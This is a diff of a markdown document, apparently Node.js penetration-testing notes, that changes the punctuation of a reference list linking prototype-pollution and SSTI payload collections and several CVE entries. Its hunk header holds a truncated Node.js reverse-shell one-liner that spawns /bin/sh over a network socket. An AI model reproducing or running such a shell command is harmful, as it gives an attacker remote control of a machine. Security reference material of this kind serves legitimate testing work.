@@ -326,16 +326,16 @@ node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh
 
 ## 8. References
 
-- Node.js official docs: https://nodejs.org/docs/
-- HackTricks - Node.js: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
-- PayloadsAllTheThings - Prototype Pollution: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
-- PayloadsAllTheThings - SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- CVE-2024-21534: https://nvd.nist.gov/vuln/detail/CVE-2024-21534
-- CVE-2024-29415: https://nvd.nist.gov/vuln/detail/CVE-2024-29415
-- CVE-2023-42282: https://nvd.nist.gov/vuln/detail/CVE-2023-42282
-- CVE-2021-44906: https://nvd.nist.gov/vuln/detail/CVE-2021-44906
-- CVE-2024-29041: https://nvd.nist.gov/vuln/detail/CVE-2024-29041
-- CVE-2025-27152: https://nvd.nist.gov/vuln/detail/CVE-2025-27152
-- CVE-2024-4367: https://nvd.nist.gov/vuln/detail/CVE-2024-4367
+- Node.js official docs - https://nodejs.org/docs/
+- HackTricks - Node.js - https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
+- PayloadsAllTheThings - Prototype Pollution - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
+- PayloadsAllTheThings - SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+- CVE-2024-21534 - https://nvd.nist.gov/vuln/detail/CVE-2024-21534
+- CVE-2024-29415 - https://nvd.nist.gov/vuln/detail/CVE-2024-29415
+- CVE-2023-42282 - https://nvd.nist.gov/vuln/detail/CVE-2023-42282
+- CVE-2021-44906 - https://nvd.nist.gov/vuln/detail/CVE-2021-44906
+- CVE-2024-29041 - https://nvd.nist.gov/vuln/detail/CVE-2024-29041
+- CVE-2025-27152 - https://nvd.nist.gov/vuln/detail/CVE-2025-27152
+- CVE-2024-4367 - https://nvd.nist.gov/vuln/detail/CVE-2024-4367
 
 ---
